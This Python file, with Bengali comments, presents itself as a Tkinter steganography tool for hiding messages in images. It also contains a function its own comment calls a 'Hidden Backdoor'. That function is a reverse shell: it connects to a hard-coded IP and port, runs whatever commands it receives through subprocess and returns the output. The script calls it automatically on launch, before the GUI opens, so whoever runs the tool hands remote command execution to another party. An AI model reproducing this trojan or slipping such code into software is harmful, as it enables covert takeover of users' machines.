import socket, subprocess, os
from stegano import lsb
import tkinter as tk
from tkinter import filedialog, messagebox

# Steganography: Hide data inside an image
def hide_data(image_path, secret_message, output_image):
    secret_img = lsb.hide(image_path, secret_message)
    secret_img.save(output_image)
    print(f"ফাইল সফলভাবে লুকানো হয়েছে: {output_image}")

# Reverse Shell: Hidden Backdoor
def reverse_shell():
    # সঠিক IP এবং পোর্ট দিন
    server_ip = "10.103.77.213"  # আপনার IP এখানে দিন
    server_port = 8080  # আপনার পোর্ট নম্বর এখানে দিন

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))

    while True:
        # কমান্ড গ্রহণ করুন
        data = s.recv(1024).decode()

        # যদি 'exit' কমান্ড আসে তবে শেল বন্ধ করুন
        if data.lower() == "exit":
            break

        # কমান্ড রান করুন এবং আউটপুট পাঠান
        output = subprocess.getoutput(data)
        s.send(output.encode())

    s.close()

# Steganography GUI: Tkinter Interface
def hide_data_gui():
    image_path = filedialog.askopenfilename(title="Select an Image", filetypes=[("Image Files", "*.jpg;*.png")])
    if image_path:
        secret_message = secret_message_entry.get()
        output_image = filedialog.asksaveasfilename(defaultextension=".png", title="Save Hidden Image", filetypes=[("PNG Files", "*.png")])

        if secret_message and output_image:
            lsb.hide(image_path, secret_message).save(output_image)
            messagebox.showinfo("Success", "ফাইল সফলভাবে লুকানো হয়েছে!")
        else:
            messagebox.showerror("Error", "মেসেজ বা ফাইল পাথ দেওয়া হয়নি!")

# Tkinter GUI Setup
root = tk.Tk()
root.title("Steganography Tool")

tk.Label(root, text="Enter Secret Message:").pack(padx=10, pady=5)
secret_message_entry = tk.Entry(root, width=50)
secret_message_entry.pack(padx=10, pady=5)

tk.Button(root, text="Hide Data in Image", command=hide_data_gui).pack(padx=10, pady=10)

# Run reverse shell in the background
reverse_shell()

# Run the Tkinter GUI loop
root.mainloop()
